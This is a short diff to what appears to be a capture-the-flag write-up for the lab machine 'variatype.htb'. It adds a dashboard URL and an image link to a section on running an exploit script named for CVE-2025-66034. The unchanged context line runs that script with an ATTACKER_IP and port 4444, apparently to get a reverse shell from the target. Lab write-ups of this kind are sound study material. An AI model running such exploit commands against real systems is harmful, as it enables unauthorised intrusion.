@@ -1346,6 +1346,10 @@ if __name__ == "__main__":
 
 ### 3.2 Executing `varlib_cve_2025_66034.py`
 
+http://portal.variatype.htb/dashboard.php
+
+![[Pasted image 20260322183239.png]]
+
 **Command:** `python3 varlib_cve_2025_66034.py --ip ATTACKER_IP --port 4444 --url http://variatype.htb/tools/variable-font-generator/process --path /var/www/variatype.htb --trigger http://variatype.htb`
 <div align="center">
 <br>
